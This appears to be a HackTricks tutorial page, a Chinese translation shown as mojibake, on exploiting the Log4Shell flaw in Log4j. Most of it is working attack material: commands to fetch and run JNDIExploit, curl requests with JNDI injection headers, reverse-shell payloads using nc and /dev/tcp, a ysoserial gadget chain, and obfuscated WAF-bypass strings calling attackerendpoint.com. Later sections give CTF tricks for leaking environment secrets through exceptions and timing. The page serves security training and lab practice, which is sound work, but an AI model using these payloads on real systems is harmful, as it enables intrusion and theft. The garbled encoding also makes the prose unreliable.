è¯·æ³¨æ„ï¼Œå‡ºäºæŸç§åŸå› ï¼Œä½œè€…åœ¨å‘ç°log4shellåå°†æ­¤é¡¹ç›®ä»githubä¸­åˆ é™¤ã€‚æ‚¨å¯ä»¥åœ¨[https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2)æ‰¾åˆ°ç¼“å­˜ç‰ˆæœ¬ï¼Œä½†å¦‚æœæ‚¨æƒ³å°Šé‡ä½œè€…çš„å†³å®šï¼Œè¯·ä½¿ç”¨å…¶ä»–æ–¹æ³•æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚

æ­¤å¤–ï¼Œæ‚¨æ— æ³•åœ¨æ—¶å…‰æœºä¸­æ‰¾åˆ°æºä»£ç ï¼Œå› æ­¤è¦ä¹ˆåˆ†ææºä»£ç ï¼Œè¦ä¹ˆåœ¨ä¸çŸ¥é“è‡ªå·±æ­£åœ¨æ‰§è¡Œä»€ä¹ˆçš„æƒ…å†µä¸‹æ‰§è¡Œjarã€‚
{% endhint %}

åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæ‚¨å¯ä»¥åœ¨8080ç«¯å£è¿è¡Œæ­¤**æ˜“å—æ”»å‡»çš„webæœåŠ¡å™¨ä»¥è¿›è¡Œlog4shell**ï¼š[https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)ï¼ˆ_åœ¨READMEä¸­æ‚¨å°†æ‰¾åˆ°å¦‚ä½•è¿è¡Œå®ƒ_ï¼‰ã€‚æ­¤æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºä½¿ç”¨æ˜“å—æ”»å‡»çš„log4shellç‰ˆæœ¬è®°å½•HTTPè¯·æ±‚å¤´_X-Api-Version_çš„å†…å®¹ã€‚

ç„¶åï¼Œæ‚¨å¯ä»¥ä¸‹è½½**JNDIExploit** jaræ–‡ä»¶å¹¶ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ‰§è¡Œå®ƒï¼š
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
åœ¨é˜…è¯»ä»£ç ä»…å‡ åˆ†é’Ÿåï¼Œåœ¨ _com.feihong.ldap.LdapServer_ å’Œ _com.feihong.ldap.HTTPServer_ ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ° **LDAP å’Œ HTTP æœåŠ¡å™¨æ˜¯å¦‚ä½•åˆ›å»ºçš„**ã€‚LDAP æœåŠ¡å™¨å°†ç†è§£éœ€è¦æä¾›çš„æœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶å°†å—å®³è€…é‡å®šå‘åˆ° HTTP æœåŠ¡å™¨ï¼Œåè€…å°†æä¾›åˆ©ç”¨ç¨‹åºã€‚\
åœ¨ _com.feihong.ldap.gadgets_ ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ° **ä¸€äº›ç‰¹å®šçš„å·¥å…·**ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡Œæ‰€éœ€çš„æ“ä½œï¼ˆå¯èƒ½æ‰§è¡Œä»»æ„ä»£ç ï¼‰ã€‚åœ¨ _com.feihong.ldap.template_ ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°ä¸åŒçš„æ¨¡æ¿ç±»ï¼Œè¿™äº›ç±»å°† **ç”Ÿæˆåˆ©ç”¨ç¨‹åº**ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`** æŸ¥çœ‹æ‰€æœ‰å¯ç”¨çš„åˆ©ç”¨ç¨‹åºã€‚ä¸€äº›æœ‰ç”¨çš„åŒ…æ‹¬ï¼š
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
æ‰€ä»¥ï¼Œåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å·²ç»æœ‰äº†é‚£ä¸ªæ˜“å—æ”»å‡»çš„dockeråº”ç”¨ç¨‹åºåœ¨è¿è¡Œã€‚è¦æ”»å‡»å®ƒï¼š
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
å½“å‘é€æ”»å‡»æ—¶ï¼Œæ‚¨å°†åœ¨æ‰§è¡Œ **JNDIExploit-1.2-SNAPSHOT.jar** çš„ç»ˆç«¯ä¸­çœ‹åˆ°ä¸€äº›è¾“å‡ºã€‚

**è¯·è®°å¾—æ£€æŸ¥ `java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` ä»¥è·å–å…¶ä»–åˆ©ç”¨é€‰é¡¹ã€‚æ­¤å¤–ï¼Œå¦‚æœéœ€è¦ï¼Œæ‚¨å¯ä»¥æ›´æ”¹ LDAP å’Œ HTTP æœåŠ¡å™¨çš„ç«¯å£ã€‚**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

ä¸ä¹‹å‰çš„åˆ©ç”¨æ–¹å¼ç±»ä¼¼ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚\
æ‚¨å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ç”Ÿæˆè¦å‘é€ç»™å—å®³è€…çš„ URLï¼š
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_è¿™ä¸ªæ”»å‡»ä½¿ç”¨è‡ªå®šä¹‰ç”Ÿæˆçš„javaå¯¹è±¡å°†åœ¨åƒ**THM solar room**è¿™æ ·çš„å®éªŒå®¤ä¸­æœ‰æ•ˆã€‚ç„¶è€Œï¼Œè¿™é€šå¸¸ä¸ä¼šæœ‰æ•ˆï¼ˆå› ä¸ºé»˜è®¤æƒ…å†µä¸‹Javaæœªé…ç½®ä¸ºä½¿ç”¨LDAPåŠ è½½è¿œç¨‹ä»£ç åº“ï¼‰ï¼Œæˆ‘è®¤ä¸ºè¿™æ˜¯å› ä¸ºå®ƒæ²¡æœ‰æ»¥ç”¨å—ä¿¡ä»»çš„ç±»æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚_

### RCE - JNDI-Injection-Exploit-Plus

[https://github.com/cckuailong/JNDI-Injection-Exploit-Plus](https://github.com/cckuailong/JNDI-Injection-Exploit-Plus) æ˜¯å¦ä¸€ä¸ªç”Ÿæˆ**å¯ç”¨JNDIé“¾æ¥**çš„å·¥å…·ï¼Œå¹¶é€šè¿‡å¯åŠ¨RMIæœåŠ¡å™¨ã€LDAPæœåŠ¡å™¨å’ŒHTTPæœåŠ¡å™¨æä¾›åå°æœåŠ¡ã€‚

### RCE - ysoserial & JNDI-Exploit-Kit

è¿™ä¸ªé€‰é¡¹å¯¹äºæ”»å‡»**ä»…ä¿¡ä»»æŒ‡å®šç±»è€Œä¸æ˜¯æ‰€æœ‰ç±»çš„Javaç‰ˆæœ¬**éå¸¸æœ‰ç”¨ã€‚å› æ­¤ï¼Œ**ysoserial**å°†ç”¨äºç”Ÿæˆ**å—ä¿¡ä»»ç±»çš„åºåˆ—åŒ–**ï¼Œè¿™äº›åºåˆ—åŒ–å¯ä»¥ç”¨ä½œ**æ‰§è¡Œä»»æ„ä»£ç **çš„å·¥å…·ï¼ˆ_ysoserialæ»¥ç”¨çš„å—ä¿¡ä»»ç±»å¿…é¡»è¢«å—å®³è€…çš„javaç¨‹åºä½¿ç”¨ï¼Œä»¥ä¾¿åˆ©ç”¨èƒ½å¤Ÿç”Ÿæ•ˆ_ï¼‰ã€‚

ä½¿ç”¨**ysoserial**æˆ–[**ysoserial-modified**](https://github.com/pimps/ysoserial-modified)ï¼Œæ‚¨å¯ä»¥åˆ›å»ºå°†è¢«JNDIä¸‹è½½çš„ååºåˆ—åŒ–åˆ©ç”¨ï¼š
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
ä½¿ç”¨ [**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) ç”Ÿæˆ **JNDI é“¾æ¥**ï¼Œå…¶ä¸­æ¼æ´å°†ç­‰å¾…æ¥è‡ªæ˜“å—æ”»å‡»æœºå™¨çš„è¿æ¥ã€‚æ‚¨å¯ä»¥æä¾› **ä¸åŒçš„åˆ©ç”¨ç¨‹åºï¼Œè¿™äº›åˆ©ç”¨ç¨‹åºå¯ä»¥ç”± JNDI-Exploit-Kit è‡ªåŠ¨ç”Ÿæˆ**ï¼Œç”šè‡³æ˜¯æ‚¨ **è‡ªå·±çš„ååºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½**ï¼ˆç”±æ‚¨æˆ– ysoserial ç”Ÿæˆï¼‰ã€‚
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (1118).png>)

ç°åœ¨æ‚¨å¯ä»¥è½»æ¾ä½¿ç”¨ç”Ÿæˆçš„ JNDI é“¾æ¥æ¥åˆ©ç”¨è¯¥æ¼æ´å¹¶è·å¾—ä¸€ä¸ª **åå‘ shell**ï¼Œåªéœ€å‘é€åˆ°ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ log4j ç‰ˆæœ¬ï¼š**`${ldap://10.10.14.10:1389/generated}`**

### ç»•è¿‡æ–¹æ³•
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:Ä±}}:ldap://...} //Notice the unicode "i"
```
### è‡ªåŠ¨æ‰«æå™¨

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - æŸ¥æ‰¾æœ¬åœ°æ˜“å—æ”»å‡»çš„åº“

### æµ‹è¯•å®éªŒå®¤

* [**LogForge HTB æœºå™¨**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar æˆ¿é—´**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Log4Shell ååˆ©ç”¨

åœ¨è¿™ä¸ª [**CTF å†™ä½œ**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) ä¸­å¾ˆå¥½åœ°è§£é‡Šäº†å¦‚ä½• **å¯èƒ½** **æ»¥ç”¨** **Log4J** çš„æŸäº›åŠŸèƒ½ã€‚

Log4j çš„ [**å®‰å…¨é¡µé¢**](https://logging.apache.org/log4j/2.x/security.html) æœ‰ä¸€äº›æœ‰è¶£çš„å¥å­ï¼š

> ä»ç‰ˆæœ¬ 2.16.0ï¼ˆå¯¹äº Java 8ï¼‰å¼€å§‹ï¼Œ**æ¶ˆæ¯æŸ¥æ‰¾åŠŸèƒ½å·²è¢«å®Œå…¨ç§»é™¤**ã€‚**é…ç½®ä¸­çš„æŸ¥æ‰¾ä»ç„¶æœ‰æ•ˆ**ã€‚æ­¤å¤–ï¼ŒLog4j ç°åœ¨é»˜è®¤ç¦ç”¨å¯¹ JNDI çš„è®¿é—®ã€‚é…ç½®ä¸­çš„ JNDI æŸ¥æ‰¾ç°åœ¨éœ€è¦æ˜¾å¼å¯ç”¨ã€‚

> ä»ç‰ˆæœ¬ 2.17.0ï¼ˆä»¥åŠ Java 7 å’Œ Java 6 çš„ 2.12.3 å’Œ 2.3.1ï¼‰å¼€å§‹ï¼Œ**ä»…åœ¨é…ç½®ä¸­çš„æŸ¥æ‰¾å­—ç¬¦ä¸²è¢«é€’å½’å±•å¼€**ï¼›åœ¨ä»»ä½•å…¶ä»–ç”¨æ³•ä¸­ï¼Œä»…è§£æé¡¶çº§æŸ¥æ‰¾ï¼Œä»»ä½•åµŒå¥—æŸ¥æ‰¾éƒ½ä¸ä¼šè¢«è§£æã€‚

è¿™æ„å‘³ç€é»˜è®¤æƒ…å†µä¸‹ä½ å¯ä»¥ **å¿˜è®°ä½¿ç”¨ä»»ä½• `jndi` æ¼æ´**ã€‚æ­¤å¤–ï¼Œè¦æ‰§è¡Œ **é€’å½’æŸ¥æ‰¾**ï¼Œä½ éœ€è¦è¿›è¡Œé…ç½®ã€‚

ä¾‹å¦‚ï¼Œåœ¨é‚£ä¸ª CTF ä¸­ï¼Œè¿™åœ¨æ–‡ä»¶ log4j2.xml ä¸­è¿›è¡Œäº†é…ç½®ï¼š
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

åœ¨ [è¿™ä¸ª CTF](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) ä¸­ï¼Œæ”»å‡»è€…æ§åˆ¶äº† `${sys:cmd}` çš„å€¼ï¼Œå¹¶éœ€è¦ä»ç¯å¢ƒå˜é‡ä¸­æå–æ ‡å¿—ã€‚\
å¦‚åœ¨ [**ä¹‹å‰çš„æœ‰æ•ˆè½½è·**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification) é¡µé¢ä¸­æ‰€è§ï¼Œæœ‰ä¸åŒçš„æ–¹æ³•å¯ä»¥è®¿é—®ç¯å¢ƒå˜é‡ï¼Œä¾‹å¦‚ï¼š**`${env:FLAG}`**ã€‚åœ¨è¿™ä¸ª CTF ä¸­è¿™æ²¡æœ‰ç”¨ï¼Œä½†åœ¨å…¶ä»–ç°å®åœºæ™¯ä¸­å¯èƒ½ä¼šæœ‰ç”¨ã€‚

### Exfiltration in Exceptions

åœ¨ CTF ä¸­ï¼Œä½  **æ— æ³•è®¿é—® java åº”ç”¨ç¨‹åºçš„ stderr**ï¼Œä½¿ç”¨ log4Jï¼Œä½† Log4J **å¼‚å¸¸ä¼šå‘é€åˆ° stdout**ï¼Œè¿™åœ¨ python åº”ç”¨ç¨‹åºä¸­è¢«æ‰“å°ã€‚è¿™æ„å‘³ç€è§¦å‘å¼‚å¸¸æ—¶æˆ‘ä»¬å¯ä»¥è®¿é—®å†…å®¹ã€‚æå–æ ‡å¿—çš„å¼‚å¸¸æ˜¯ï¼š**`${java:${env:FLAG}}`**ã€‚è¿™æœ‰æ•ˆæ˜¯å› ä¸º **`${java:CTF{blahblah}}`** ä¸å­˜åœ¨ï¼Œå¼‚å¸¸çš„å€¼å°†æ˜¾ç¤ºæ ‡å¿—ï¼š

![](<../../.gitbook/assets/image (1023).png>)

### Conversion Patterns Exceptions

ä»…æåŠï¼Œä½ è¿˜å¯ä»¥æ³¨å…¥æ–°çš„ [**è½¬æ¢æ¨¡å¼**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) å¹¶è§¦å‘å°†è¢«è®°å½•åˆ° `stdout` çš„å¼‚å¸¸ã€‚ä¾‹å¦‚ï¼š

![](<../../.gitbook/assets/image (683).png>)

è¿™åœ¨æå–é”™è¯¯æ¶ˆæ¯ä¸­çš„æ•°æ®æ—¶å¹¶æ²¡æœ‰è¢«å‘ç°æœ‰ç”¨ï¼Œå› ä¸ºæŸ¥æ‰¾åœ¨è½¬æ¢æ¨¡å¼ä¹‹å‰æ²¡æœ‰è§£å†³ï¼Œä½†å®ƒå¯èƒ½å¯¹å…¶ä»–äº‹æƒ…å¦‚æ£€æµ‹æœ‰ç”¨ã€‚

### Conversion Patterns Regexes

ç„¶è€Œï¼Œå¯ä»¥ä½¿ç”¨ä¸€äº› **æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼çš„è½¬æ¢æ¨¡å¼** é€šè¿‡ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å’Œæ»¥ç”¨ **äºŒåˆ†æŸ¥æ‰¾** æˆ– **åŸºäºæ—¶é—´** çš„è¡Œä¸ºæ¥æå–ä¿¡æ¯ã€‚

* **é€šè¿‡å¼‚å¸¸æ¶ˆæ¯çš„äºŒåˆ†æŸ¥æ‰¾**

è½¬æ¢æ¨¡å¼ **`%replace`** å¯ä»¥ç”¨æ¥ **æ›¿æ¢** **å­—ç¬¦ä¸²** ä¸­çš„ **å†…å®¹**ï¼Œç”šè‡³ä½¿ç”¨ **æ­£åˆ™è¡¨è¾¾å¼**ã€‚å®ƒçš„å·¥ä½œæ–¹å¼æ˜¯ï¼š`replace{pattern}{regex}{substitution}`\
æ»¥ç”¨è¿™ç§è¡Œä¸ºï¼Œä½ å¯ä»¥ä½¿æ›¿æ¢ **åœ¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å­—ç¬¦ä¸²ä¸­çš„ä»»ä½•å†…å®¹æ—¶è§¦å‘å¼‚å¸¸**ï¼ˆå¦‚æœæœªæ‰¾åˆ°åˆ™ä¸è§¦å‘å¼‚å¸¸ï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **åŸºäºæ—¶é—´çš„**

æ­£å¦‚å‰ä¸€èŠ‚æåˆ°çš„ï¼Œ**`%replace`** æ”¯æŒ **regexes**ã€‚å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨æ¥è‡ª [**ReDoS é¡µé¢**](../regular-expression-denial-of-service-redos.md) çš„æœ‰æ•ˆè½½è·æ¥å¯¼è‡´ **è¶…æ—¶**ï¼Œå¦‚æœæ‰¾åˆ°æ ‡å¿—ã€‚\
ä¾‹å¦‚ï¼Œåƒ `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` çš„æœ‰æ•ˆè½½è·å°†åœ¨è¯¥ CTF ä¸­è§¦å‘ **è¶…æ—¶**ã€‚

åœ¨è¿™ä¸ª [**å†™ä½œ**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) ä¸­ï¼Œä½¿ç”¨äº† **æ”¾å¤§æ”»å‡»** è€Œä¸æ˜¯ ReDoS æ”»å‡»æ¥é€ æˆå“åº”ä¸­çš„æ—¶é—´å·®ï¼š

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> å¦‚æœæ ‡å¿—ä»¥ `flagGuess` å¼€å¤´ï¼Œæ•´ä¸ªæ ‡å¿—å°†è¢« 29 ä¸ª `#` æ›¿æ¢ï¼ˆæˆ‘ä½¿ç”¨è¿™ä¸ªå­—ç¬¦æ˜¯å› ä¸ºå®ƒå¯èƒ½ä¸ä¼šæ˜¯æ ‡å¿—çš„ä¸€éƒ¨åˆ†ï¼‰ã€‚**ç„¶åå°†ç»“æœä¸­çš„æ¯ä¸ª 29 ä¸ª `#` æ›¿æ¢ä¸º 54 ä¸ª `#`**ã€‚è¿™ä¸ªè¿‡ç¨‹é‡å¤ **6 æ¬¡**ï¼Œå¯¼è‡´æ€»å…± ` 29*54*54^6* =`` `` `**`96816014208`** **`#`ï¼**
>
> æ›¿æ¢å¦‚æ­¤å¤šçš„ `#` å°†è§¦å‘ Flask åº”ç”¨ç¨‹åºçš„ 10 ç§’è¶…æ—¶ï¼Œè¿™å°†å¯¼è‡´ HTTP çŠ¶æ€ä»£ç  500 è¢«å‘é€ç»™ç”¨æˆ·ã€‚ï¼ˆå¦‚æœæ ‡å¿—ä¸ä»¥ `flagGuess` å¼€å¤´ï¼Œæˆ‘ä»¬å°†æ”¶åˆ°é 500 çŠ¶æ€ä»£ç ï¼‰

## å‚è€ƒæ–‡çŒ®

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)


{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
